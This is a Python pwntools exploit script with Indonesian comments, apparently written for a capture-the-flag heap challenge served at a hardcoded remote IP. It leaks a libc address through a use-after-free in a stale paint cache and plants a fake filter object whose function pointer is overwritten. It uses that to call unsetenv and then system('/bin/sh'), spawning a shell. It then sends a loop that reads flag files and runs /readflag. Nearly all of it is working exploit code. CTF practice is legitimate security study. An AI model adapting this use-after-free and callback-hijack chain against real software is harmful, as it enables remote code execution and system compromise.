#!/usr/bin/env python3
from pathlib import Path

from pwn import *

HOST = "15.235.202.47"
PORT = 9001

context.arch = "amd64"
context.log_level = "debug" if args.DEBUG else "info"

PROMPT = b"glyph> "

# Offset berdasarkan libc.so.6 dari challenge.
UNSORTED_FD_OFFSET = 0x203B20
SYSTEM_OFFSET = 0x58750
UNSETENV_OFFSET = 0x4ADA0

# "GYPHFLIF" dalam little-endian.
FILTER_MAGIC = 0x46494C4648505947


def find_local_file(names):
    for name in names:
        path = Path(name)
        if path.exists():
            return str(path)

    raise FileNotFoundError(f"File lokal tidak ditemukan: {names}")


def start():
    if args.LOCAL:
        run_script = find_local_file(
            [
                "./public/run.sh",
                "./run.sh",
            ]
        )

        return process(["/bin/sh", run_script])

    return remote(HOST, PORT)


def command(io, data):
    if isinstance(data, str):
        data = data.encode()

    io.sendline(data)
    return io.recvuntil(PROMPT, drop=True)


def parse_uaf_leak(output):
    match = re.search(rb"raw=([0-9a-fA-F]+)", output)
    if not match:
        log.failure(f"Raw leak tidak ditemukan:\n{output!r}")
        raise RuntimeError("failed to parse inspect output")

    raw = bytes.fromhex(match.group(1).decode())

    if len(raw) < 16:
        raise RuntimeError("inspect leak terlalu pendek")

    unsorted_fd = u64(raw[0:8])
    next_chunk_header = u64(raw[8:16])

    libc_base = unsorted_fd - UNSORTED_FD_OFFSET

    if libc_base & 0xFFF:
        log.warning(
            f"libc base tidak page-aligned: {libc_base:#x}"
        )

    # bk pada chunk stale menunjuk header chunk 0x430 kedua.
    fake_filter = next_chunk_header + 0x10

    log.info(f"unsorted fd       = {unsorted_fd:#x}")
    log.info(f"next chunk header = {next_chunk_header:#x}")
    log.success(f"libc base         = {libc_base:#x}")
    log.success(f"fake filter       = {fake_filter:#x}")

    return libc_base, fake_filter


def create_stale_paint(
    io,
    document,
    replacement_style,
    initial_style=None,
):
    command(io, b"load " + document)

    if initial_style is not None:
        command(io, b"style " + initial_style)

    command(io, b"layout")
    command(io, b"paint")

    # Style lama menjadi retired, tetapi paint cache tetap menunjuk
    # ComputedStyle lama karena layout hash tidak berubah.
    command(io, b"style " + replacement_style)

    # Membebaskan arena retired tanpa membuang paint cache.
    output = command(io, b"optimize")

    if b"paint cache kept" not in output:
        log.failure(output.decode(errors="replace"))
        raise RuntimeError("paint cache tidak dipertahankan")

    output = command(io, b"inspect paint raw")
    return parse_uaf_leak(output)


def install_callback(io, fake_filter, callback):
    # Allocation profile pertama mengambil kembali chunk ComputedStyle
    # yang masih ditunjuk paint cache.
    stale_style = bytearray(0x18)
    stale_style[0x10:0x18] = p64(fake_filter)

    output = command(
        io,
        b"profile add " + stale_style.hex().encode(),
    )

    if b"stored page=" not in output:
        raise RuntimeError("gagal menyimpan stale style page")

    # Allocation kedua mengambil chunk arena berikutnya.
    # Layout:
    #   +0x00 = magic
    #   +0x08 = function pointer
    filter_object = flat(
        FILTER_MAGIC,
        callback,
    )

    output = command(
        io,
        b"profile add " + filter_object.hex().encode(),
    )

    if b"stored page=" not in output:
        raise RuntimeError("gagal menyimpan fake filter page")


def main():
    io = start()
    io.recvuntil(PROMPT)

    # ------------------------------------------------------------
    # Stage 1: unsetenv("LD_LIBRARY_PATH")
    #
    # system("/bin/sh") langsung bisa gagal karena shell eksternal
    # mencoba memakai libc bundle challenge. Bersihkan env tersebut
    # lebih dulu memakai primitive callback satu argumen.
    # ------------------------------------------------------------
    libc_base, fake_filter = create_stale_paint(
        io,
        document=b"LD_LIBRARY_PATH",
        initial_style=b"one",
        replacement_style=b"two",
    )

    unsetenv = libc_base + UNSETENV_OFFSET

    log.info(f"unsetenv = {unsetenv:#x}")

    install_callback(
        io,
        fake_filter=fake_filter,
        callback=unsetenv,
    )

    output = command(io, b"render")

    if b"filter missing" in output:
        raise RuntimeError("fake filter stage 1 gagal")

    log.success("LD_LIBRARY_PATH berhasil dibersihkan")

    # ------------------------------------------------------------
    # Stage 2: system("/bin/sh")
    #
    # Style 'two' masih aktif. Buat paint cache baru yang menunjuk
    # style tersebut, retire lewat style 'three', lalu reclaim lagi.
    # ------------------------------------------------------------
    libc_base_2, fake_filter_2 = create_stale_paint(
        io,
        document=b"/bin/sh",
        initial_style=None,
        replacement_style=b"three",
    )

    if libc_base_2 != libc_base:
        log.warning(
            f"libc base berubah: {libc_base:#x} -> "
            f"{libc_base_2:#x}"
        )

    system = libc_base_2 + SYSTEM_OFFSET

    log.info(f"system = {system:#x}")

    install_callback(
        io,
        fake_filter=fake_filter_2,
        callback=system,
    )

    # render memanggil callback dengan document string sebagai RDI:
    # system("/bin/sh")
    io.sendline(b"render")

    log.success("Shell seharusnya sudah aktif")

    # Coba ambil flag otomatis, lalu tetap masuk interactive.
    io.sendline(
        b'for f in /flag /flag.txt ./flag ./flag.txt; '
        b'do [ -f "$f" ] && cat "$f"; done; '
        b'[ -x /readflag ] && /readflag'
    )

    io.interactive()


if __name__ == "__main__":
    main()
